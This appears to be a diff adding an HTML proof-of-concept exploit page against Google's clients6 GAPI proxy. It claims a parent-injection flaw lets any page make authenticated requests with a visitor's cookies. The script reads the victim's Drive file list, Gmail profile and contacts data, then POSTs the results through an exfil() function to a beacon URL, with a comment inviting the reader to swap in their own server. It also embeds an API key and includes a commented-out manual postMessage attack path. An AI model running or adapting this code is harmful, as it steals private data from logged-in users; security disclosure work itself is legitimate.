@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>clients6 GAPI Proxy Parent Injection PoC</title>
+<style>
+body { font-family: monospace; background: #0d0d0d; color: #00ff88; margin: 20px; }
+h2 { color: #ff4444; }
+.warn { color: #ffaa00; }
+.ok { color: #00ff88; }
+.data { color: #44aaff; word-break: break-all; }
+pre { background: #1a1a1a; padding: 10px; border-left: 3px solid #333; overflow-x: auto; white-space: pre-wrap; }
+#log { max-height: 500px; overflow-y: auto; }
+</style>
+</head>
+<body>
+
+<h2>clients6.google.com GAPI Root Proxy — Parent Injection</h2>
+
+<p class="warn">
+Bug: <code>clients6.google.com/static/proxy.html</code> reads <code>#parent</code> and <code>#rpctoken</code>
+from its own URL hash — attacker-controlled. GAPI <code>makeHttpRequests</code> validates these values
+(which we set) instead of verifying the actual calling origin against an allowlist.<br>
+Result: any page can trigger authenticated same-origin XHR to <code>clients6.google.com/*</code>
+using the victim's Google cookies → Drive file read, and potentially other APIs.
+</p>
+
+<p class="warn">
+<b>To test:</b> Open this page in a browser where you are logged into Google.
+If the attack works, your Drive file list will appear below within ~5 seconds.
+</p>
+
+<hr>
+<div id="log"></div>
+<div id="results"></div>
+
+<script>
+
+const logEl = document.getElementById('log');
+function log(cls, msg) {
+  const d = document.createElement('pre');
+  d.className = cls;
+  d.textContent = '[' + new Date().toISOString().slice(11,23) + '] ' + msg;
+  logEl.prepend(d);
+  console.log(cls, msg);
+}
+
+// Exfil target — replace with your own server in a real attack
+// Using a relative path here so we can see if the request fires at all
+const EXFIL_URL = 'https://colab.research.google.com/__poc_gapi_drive_beacon';
+
+function exfil(data) {
+  fetch(EXFIL_URL, {
+    method: 'POST',
+    credentials: 'include',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(data),
+  }).catch(() => {});
+}
+
+// Drive web app API key (visible in all Drive web traffic, not a secret)
+const DRIVE_KEY = 'AIzaSyCN_sSPJMpYrAzC5AtTrltNC8oRmLtoqBk';
+
+// Step 1: Load GAPI
+log('ok', 'Loading GAPI...');
+
+function onGapiLoad() {
+  log('ok', 'GAPI loaded. Initializing client...');
+
+  // gapi.load('client') triggers GAPI to create the XD3 proxy iframe at:
+  // https://clients6.google.com/static/proxy.html
+  //   #parent=<CURRENT_PAGE_ORIGIN>&rpctoken=<RANDOM_TOKEN>
+  // The proxy reads these from ITS OWN hash → we are the trusted parent.
+  gapi.load('client', {
+    callback: function() {
+      log('ok', 'GAPI client loaded. Proxy iframe created. Making Drive API call...');
+
+      // gapi.client.request routes through clients6.google.com XD3 proxy
+      // Proxy makes same-origin XHR: clients6.google.com/drive/v3/files
+      // Google cookies are included (same-origin context within the proxy iframe)
+      gapi.client.request({
+        path: '/drive/v3/files',
+        method: 'GET',
+        params: {
+          key: DRIVE_KEY,
+          fields: 'nextPageToken,files(id,name,mimeType,modifiedTime,size,webViewLink,parents)',
+          pageSize: 20,
+          orderBy: 'modifiedTime desc',
+        },
+        callback: function(response) {
+          if (!response) {
+            log('warn', 'No response received.');
+            return;
+          }
+
+          if (response.error) {
+            log('warn', 'API Error: ' + JSON.stringify(response.error));
+
+            // Common errors and what they mean:
+            // 401 = cookies not sent or not valid (SameSite block?)
+            // 403 = API key invalid or quota exceeded
+            // 400 = bad request format
+            // 200 with empty files = authenticated but no files? (unlikely)
+            return;
+          }
+
+          const files = response.files || [];
+          log('ok', '✅ DRIVE FILES READ! Count: ' + files.length);
+
+          files.forEach((f, i) => {
+            log('data', `[${i}] ${f.name} (${f.mimeType}) — modified: ${f.modifiedTime}`);
+          });
+
+          const resultEl = document.getElementById('results');
+          resultEl.innerHTML = '<h3 style="color:#ff4444">VICTIM DRIVE FILES:</h3>' +
+            '<pre style="color:#44aaff">' + JSON.stringify(response, null, 2) + '</pre>';
+
+          exfil({ type: 'drive_files', files: files });
+        }
+      });
+
+      // Also try Gmail (if accessible at clients6.google.com)
+      setTimeout(function() {
+        log('ok', 'Trying Gmail API via same proxy...');
+        gapi.client.request({
+          path: '/gmail/v1/users/me/profile',
+          method: 'GET',
+          params: { key: DRIVE_KEY },
+          callback: function(r) {
+            if (r && !r.error) {
+              log('ok', '✅ GMAIL ACCESSIBLE: ' + JSON.stringify(r).substring(0, 200));
+              exfil({ type: 'gmail_profile', data: r });
+            } else {
+              log('warn', 'Gmail: ' + JSON.stringify(r && r.error ? r.error : r).substring(0, 200));
+            }
+          }
+        });
+      }, 2000);
+
+      // And People API (contacts)
+      setTimeout(function() {
+        log('ok', 'Trying People API...');
+        gapi.client.request({
+          path: '/people/v1/people/me',
+          method: 'GET',
+          params: { key: DRIVE_KEY, personFields: 'names,emailAddresses' },
+          callback: function(r) {
+            if (r && !r.error) {
+              log('ok', '✅ PEOPLE API: ' + JSON.stringify(r).substring(0, 300));
+              exfil({ type: 'people_profile', data: r });
+            } else {
+              log('warn', 'People: ' + JSON.stringify(r && r.error ? r.error : r).substring(0, 200));
+            }
+          }
+        });
+      }, 3000);
+    },
+    onerror: function() {
+      log('warn', 'gapi.load error — GAPI client failed to initialize.');
+    }
+  });
+}
+
+// Load GAPI
+const gapiScript = document.createElement('script');
+gapiScript.src = 'https://apis.google.com/js/api.js?onload=onGapiLoad';
+// Note: onload= is a legacy mechanism but still works
+document.head.appendChild(gapiScript);
+window.onGapiLoad = onGapiLoad;
+
+log('warn', 'Waiting for GAPI to load from apis.google.com...');
+
+// ----------------------------------------------------------------
+// ALTERNATIVE: Manual postMessage approach (if GAPI init fails)
+// ----------------------------------------------------------------
+// If GAPI refuses to work from a non-google.com origin, try manual approach:
+// Uncomment and test this block.
+/*
+setTimeout(function() {
+  log('warn', 'Trying manual postMessage approach...');
+
+  const rpcToken = 'poc-token-' + Math.random().toString(36).substr(2);
+  const proxyUrl = 'https://clients6.google.com/static/proxy.html?usegapi=1' +
+    '#parent=' + encodeURIComponent(location.origin) +
+    '&rpctoken=' + rpcToken +
+    '&origin=' + encodeURIComponent(location.origin);
+
+  const iframe = document.createElement('iframe');
+  iframe.style.display = 'none';
+  iframe.src = proxyUrl;
+  document.body.appendChild(iframe);
+
+  // Listen for proxy ready signal
+  window.addEventListener('message', function handler(e) {
+    if (e.source !== iframe.contentWindow) return;
+    log('data', 'Message from proxy: ' + JSON.stringify(e.data).substring(0, 300));
+
+    // Try raw GAPI RPC message to call makeHttpRequests
+    const reqMsg = JSON.stringify({
+      s: '..',
+      f: 'makeHttpRequests',
+      c: 'poc-1',
+      a: [{
+        url: '/drive/v3/files?key=' + DRIVE_KEY + '&fields=files(id,name)&pageSize=10',
+        method: 'GET',
+        headers: {},
+        responseExpected: true
+      }],
+      t: rpcToken,
+      l: null,
+      g: false
+    });
+
+    iframe.contentWindow.postMessage(reqMsg, 'https://clients6.google.com');
+    log('ok', 'Sent makeHttpRequests to proxy');
+  });
+}, 5000);
+*/
+
+</script>
+</body>
+</html>
